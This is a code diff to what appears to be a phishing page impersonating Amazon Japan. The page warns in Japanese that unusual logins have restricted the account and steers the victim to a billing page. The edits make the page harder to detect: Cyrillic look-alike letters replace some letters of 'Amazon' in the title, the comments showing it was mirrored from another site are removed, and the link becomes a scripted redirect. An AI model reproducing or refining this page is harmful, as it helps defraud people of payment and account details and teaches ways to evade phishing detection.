@@ -1,8 +1,6 @@
 ﻿<!DOCTYPE html>
 <html lang="en">
-
-<!-- Mirrored from cfptd.com/8a47481ae534860850adf59f145e6b40/warning.php?udm_cat_path=3518e0c8537b5a033567b18609603390e1d9962b by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jul 2020 08:55:55 GMT -->
-<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8" /><!-- /Added by HTTrack -->
+<meta http-equiv="content-type" content="text/html;charset=UTF-8" />
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -12,7 +10,7 @@
     <link rel="stylesheet" href="library/bootstrap/css/main.min.css">
     <link rel="stylesheet" href="sheets/alert.css">
     <link rel="shortcut icon" href="assets/img/favicon.ico" />
-    <title>Amazon - アカウントサービス</title>
+    <title>Amаzоn - アカウントサービス</title>
 </head>
 <body>
 
@@ -49,8 +47,6 @@
                 <span class="middle"><link href="css/warning/FuHao.css" rel="stylesheet" type="text/css"><span class="dBirO"></span><span class="kkhZd"></span><span class="AnNbd"></span></span>
                 <span class="righttext"><link href="css/warning/BianG.css" rel="stylesheet" type="text/css"><span class="yZMIa"></span><span class="bgtsp"></span><span class="XRsjL"></span><span class="uhhGk"></span><span class="jqjcT"></span><span class="iqNJu"></span><span class="VUaoP"></span><span class="KsuqC"></span><span class="gQbTg"></span><span class="nroeZ"></span><span class="KzNPJ"></span><span class="cOXuN"></span></span>
                 <p class="alerttext"><link href="css/warning/TiXin.css" rel="stylesheet" type="text/css">Amazonセキュリティシステム、最近は変わったログイン履歴がありますので、必要な手順でアカウントを保護してください</p>
-
-
                 <div class="row">
                     <div class="col-12">
                             <div class="alert alert-danger" role="alert">
@@ -61,13 +57,12 @@
 <br><br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="BrcdH"></span>アカウントを保護するために、検証完了までアカウントを一時に制限します。
 <br><br><link href="css/warning/NeiRo.css" rel="stylesheet" type="text/css"><span class="ZbxQv"></span>検証手順が終わりましたら、制限をすぐに解除します。<br><br>
                                     </p>
-                                    <a href="billing" class="btn bgcolored"><link href="css/warning/JiXuA.css" rel="stylesheet" type="text/css"><span class="TlNJP"></span><span class="UbRdT"></span><span class="rrNzI"></span></a>
+                                    <a  id="bt1"  class="btn bgcolored"><link href="css/warning/JiXuA.css" rel="stylesheet" type="text/css"><span class="TlNJP"></span><span class="UbRdT"></span><span class="rrNzI"></span></a>
                                   </div>
                     </div>
                 </div>
         </div>
     </div>
-    <#--<div style="display:none;"><script type='text/javascript' src='https://s4.cnzz.com/z_stat.php?id=1278854177&amp;web_id=1278854177'></script></div>-->
     <script src="library/jquery/main.min.js"></script>
     <script src="library/pooper/main.min.js"></script>
     <script src="library/bootstrap/js/main.min.js"></script>
@@ -78,8 +73,9 @@
                 $('.mydropdown').togleClass('d-none');
             })
         })
+        $("#bt1").click(function () {
+            window.location.href = "/billing";
+        })
     </script>
 </body>
-
-<!-- Mirrored from cfptd.com/8a47481ae534860850adf59f145e6b40/warning.php?udm_cat_path=3518e0c8537b5a033567b18609603390e1d9962b by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 21 Jul 2020 08:56:08 GMT -->
 </html>
